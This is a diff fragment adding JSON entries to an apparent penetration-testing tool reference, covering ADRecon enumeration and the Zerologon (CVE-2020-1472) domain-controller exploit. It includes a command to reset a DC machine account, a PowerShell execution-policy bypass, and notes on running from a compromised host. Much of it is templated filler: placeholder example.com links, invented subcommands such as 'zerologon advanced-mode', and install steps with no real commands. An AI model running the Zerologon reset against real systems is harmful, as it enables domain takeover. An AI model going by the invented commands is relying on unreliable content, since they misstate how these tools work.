+    ],
+    "operational_tips": [
+      "Always verify ADRecon is installed correctly before engagements",
+      "Use ADRecon within scope boundaries defined in rules of engagement",
+      "Document all ADRecon findings for reporting",
+      "Review ADRecon output for false positives"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic ADRecon workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for ADRecon assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute ADRecon",
+            "details": "Run ADRecon with appropriate options",
+            "command": "adrecon target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review ADRecon output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "ADRecon integration workflow",
+        "stages": [
+          {
+            "label": "Initialize ADRecon",
+            "description": "Prepare ADRecon for use",
+            "command": "adrecon init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run ADRecon scan on target",
+            "command": "adrecon scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export ADRecon findings",
+            "command": "adrecon export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] ADRecon execution successful",
+        "meaning": "ADRecon ran without errors",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] ADRecon finding detected",
+        "meaning": "Potential security issue found by ADRecon",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced ADRecon techniques",
+        "scenario": "Complex ADRecon scenarios in advanced assessments",
+        "command": "adrecon advanced-mode",
+        "notes": [
+          "Use for complex ADRecon scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "Official ADRecon documentation",
+        "url": "https://example.com/adrecon",
+        "description": "Official guide for ADRecon"
+      },
+      {
+        "label": "ADRecon GitHub repository",
+        "url": "https://github.com/example/adrecon",
+        "description": "Source code and community discussions"
+      }
+    ],
+    "installation": [
+      {
+        "platform": "Windows PowerShell",
+        "summary": "ADRecon setup",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/sense-of-security/ADRecon.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd ADRecon && powershell -ExecutionPolicy Bypass",
+            "copyable": true
+          },
+          {
+            "detail": ".\\ADRecon.ps1",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Linux PowerShell Core",
+        "summary": "ADRecon on Linux",
+        "steps": [
+          {
+            "detail": "pwsh",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/sense-of-security/ADRecon.git",
+            "copyable": true
+          },
+          {
+            "detail": ".\\ADRecon.ps1",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Domain-Joined Machine",
+        "summary": "From compromised system",
+        "steps": [
+          {
+            "detail": "# Execute on domain-joined workstation",
+            "copyable": false
+          },
+          {
+            "detail": ".\\ADRecon.ps1 -GenExcel -OutputPath C:\\Temp\\",
+            "copyable": true
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "zerologon",
+    "name": "Zerologon",
+    "summary": "Exploitation guide for CVE-2020-1472 Active Directory vulnerability",
+    "details": "Comprehensive guide for using Zerologon in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install Zerologon on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install Zerologon",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install Zerologon on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install Zerologon on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run Zerologon in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing Zerologon",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run zerologon exploit",
+        "command": "python3 zerologon_tester.py target.domain.com 192.168.1.100",
+        "notes": [
+          "Test vulnerability"
+        ]
+      },
+      {
+        "description": "Reset machine account",
+        "command": "python3 zerologon_exploit.py 'DC$' 192.168.1.100",
+        "notes": [
+          "Exploit flow"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
+    ],
+    "operational_tips": [
+      "CVE-2020-1472 - Critical AD vulnerability",
+      "Allows domain compromise without credentials",
+      "Patched but often unpatched in networks",
+      "Assessment tool for AD security testing",
+      "Resets machine account password"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic Zerologon workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for Zerologon assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute Zerologon",
+            "details": "Run Zerologon with appropriate options",
+            "command": "zerologon target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review Zerologon output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Zerologon integration workflow",
+        "stages": [
+          {
+            "label": "Initialize Zerologon",
+            "description": "Prepare Zerologon for use",
+            "command": "zerologon init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run Zerologon scan on target",
+            "command": "zerologon scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export Zerologon findings",
+            "command": "zerologon export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] Zerologon execution successful",
+        "meaning": "Zerologon ran without errors",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] Zerologon finding detected",
+        "meaning": "Potential security issue found by Zerologon",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced Zerologon techniques",
+        "scenario": "Complex Zerologon scenarios in advanced assessments",
+        "command": "zerologon advanced-mode",
+        "notes": [
+          "Use for complex Zerologon scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "Official Zerologon documentation",
+        "url": "https://example.com/zerologon",
+        "description": "Official guide for Zerologon"
+      },
+      {
+        "label": "Zerologon GitHub repository",
+        "url": "https://github.com/example/zerologon",
+        "description": "Source code and community discussions"
+      }
+    ]
+  }
+]
